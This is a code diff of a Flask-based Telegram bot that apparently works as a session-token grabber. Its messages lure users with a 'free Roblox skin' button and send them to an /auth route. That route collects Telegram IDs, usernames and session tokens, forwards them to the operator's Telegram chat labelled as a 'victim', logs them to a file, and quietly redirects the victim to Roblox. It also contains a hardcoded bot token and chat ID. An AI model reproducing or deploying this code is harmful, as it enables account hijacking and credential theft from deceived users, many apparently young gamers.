@@ -1,34 +1,49 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, redirect, jsonify
 import requests
 import json
+from datetime import datetime
 
 app = Flask(__name__)
 
 BOT_TOKEN = "7854566294:AAGyNSrEwNeZ9SNEFR2HZKNaYkv3ZhIoTXk"
 CHAT_ID = "5388340518"
-WEBAPP_URL = "https://tg-session-grabber.onrender.com"
 
-@app.route('/', methods=['GET'])
+@app.route('/')
 def index():
     return open('index.html').read()
 
-@app.route('/steal', methods=['POST'])
-def steal():
-    data = request.get_json()
-    print(f"Received: {data}")
+@app.route('/auth', methods=['GET', 'POST'])
+def auth():
+    # Получаем все данные от виджета
+    token = request.args.get('token')
+    id = request.args.get('id')
+    username = request.args.get('username')
+    first_name = request.args.get('first_name')
+    auth_date = request.args.get('auth_date')
+    photo_url = request.args.get('photo_url')
     
-    if data and data.get('id'):
-        msg = f"🔥 ЖЕРТВА 🔥\n\nID: {data['id']}\n"
-        if data.get('username'):
-            msg += f"@{data['username']}\n"
-        if data.get('first_name'):
-            msg += f"{data['first_name']}\n"
-        
-        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
-        requests.post(url, json={'chat_id': CHAT_ID, 'text': msg})
-        return jsonify({'status': 'ok'})
+    # Формируем сообщение
+    msg = f"🔥 **НОВАЯ ЖЕРТВА** 🔥\n\n"
+    msg += f"🆔 ID: {id}\n"
+    if username:
+        msg += f"📛 Username: @{username}\n"
+    if first_name:
+        msg += f"📝 Имя: {first_name}\n"
+    if token:
+        msg += f"\n🔑 **ТОКЕН СЕССИИ:**\n`{token[:100]}`\n"
+    msg += f"\n⏱ Время: {datetime.now().strftime('%H:%M:%S')}"
     
-    return jsonify({'status': 'error'}), 400
+    # Отправляем в Telegram
+    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+    requests.post(url, json={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
+    
+    # Сохраняем токен в файл
+    if token:
+        with open('tokens.txt', 'a') as f:
+            f.write(f"{datetime.now()}|{id}|{username}|{token}\n")
+    
+    # Редиректим на Roblox (жертва не палится)
+    return redirect('https://www.roblox.com/games/')
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
@@ -38,13 +53,13 @@ def webhook():
         keyboard = {
             "inline_keyboard": [[{
                 "text": "🎁 Забрать скин",
-                "web_app": {"url": WEBAPP_URL}
+                "url": "https://tg-session-grabber.onrender.com"
             }]]
         }
         url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
         payload = {
             'chat_id': chat_id,
-            'text': "Нажми на кнопку!",
+            'text': "🔥 Нажми на кнопку, чтобы получить бесплатный скин Roblox!",
             'reply_markup': json.dumps(keyboard)
         }
         requests.post(url, json=payload)
